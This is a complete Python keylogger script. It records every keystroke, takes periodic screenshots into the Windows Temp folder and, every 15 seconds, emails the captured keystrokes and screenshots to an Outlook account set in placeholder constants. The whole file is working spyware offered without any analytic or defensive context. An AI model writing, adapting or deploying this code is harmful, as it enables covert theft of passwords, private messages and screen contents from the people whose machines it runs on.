#!/usr/bin/env python3

import keyboard
import pyautogui
from threading import Timer
from datetime import datetime
from redmail import outlook

INTERVAL = 15
EMAIL_ADDRESS= "XXXXX@outlook.com"
EMAIL_PASSWORD ="XXXXX"

class Keylogger:
    def __init__(self, interval, report_method='email'):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
    
    def callback (self, event):
        name = event.name
        if len(name)>1:
            if name== "space":
                name = "[SPACE]"
            elif name == "enter":
                name ="[ENTER]"
            elif name == "backspace":
                name ="[BACKSPACE]"
            elif name == "tab":
                name = "[TAB]"
            elif name == "shift":
                name = ""
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        if keyboard.is_pressed("shift") and name == "1":
            name = "!"
        if keyboard.is_pressed("shift") and name == "2":
            name = "@"
        if keyboard.is_pressed("shift") and name == "3":
            name = "#"
        if keyboard.is_pressed("shift") and name == "4":
            name = "$"
        if keyboard.is_pressed("shift") and name == "5":
            name = "%"
        if keyboard.is_pressed("shift") and name == "6":
            name = "^"
        if keyboard.is_pressed("shift") and name == "7":
            name = "&"
        if keyboard.is_pressed("shift") and name == "8":
            name = "*"
        if keyboard.is_pressed("shift") and name == "9":
            name = "("
        if keyboard.is_pressed("shift") and name == "0":
            name = ")"
        if keyboard.is_pressed("shift") and name == "-":
            name = "_"
        if keyboard.is_pressed("shift") and name == "=":
            name = "+"
        if keyboard.is_pressed("shift") and name == "[":
            name = "{"
        if keyboard.is_pressed("shift") and name == "]":
            name = "}"
        if keyboard.is_pressed("shift") and name == "\\":
            name = "|"
        if keyboard.is_pressed("shift") and name == ",":
            name = "<"
        if keyboard.is_pressed("shift") and name == ".":
            name = ">"
        if keyboard.is_pressed("shift") and name == "/":
            name = "?"
        if keyboard.is_pressed("shift") and name == "`":
            name = "~"
        if keyboard.is_pressed("shift") and name == ";":
            name = ":"
        if keyboard.is_pressed("shift") and name == "'":
            name = '"'
        if keyboard.is_pressed("shift"):
            name = name.upper()
        self.log += name

    # File Updates
    def update_filename(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":","")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":","")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    # Reporting to file
    def report_to_file(self):
        with open(f"{self.filename}.txt", "w") as f:
            print(self.log, file=f)
        print(f"{self.filename}.txt")

    def screenshot(self):
        img = pyautogui.screenshot()
        img.save(r"C:\Windows\Temp\screenshot_1.png")

    def sendmail(self, email, password, message):
        self.screenshot()
        outlook.username = email
        outlook.password = password

        outlook.send(
                subject = 'Keylogger logs',
                sender = email,
                receivers = [email],
                text = message
                 )

        outlook.send(
                subject = 'Screenshot',
                sender = email,
                receivers = [email],
                html = """
                    <h1>Screenshot</h1>
                    {{ my_image }}
                """,
                #use_jinja=False
                body_images={
                    'my_image': 'C:\Windows\Temp\screenshot_1.png'
                    }
                )

    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()
            self.start_dt = datetime.now()
        self.log = ""
        timer= Timer(interval = self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
       #self.screenshot()
        self.report()
        keyboard.wait()

if __name__ == "__main__":
    keylogger = Keylogger(interval=INTERVAL, report_method="email")
    keylogger.start()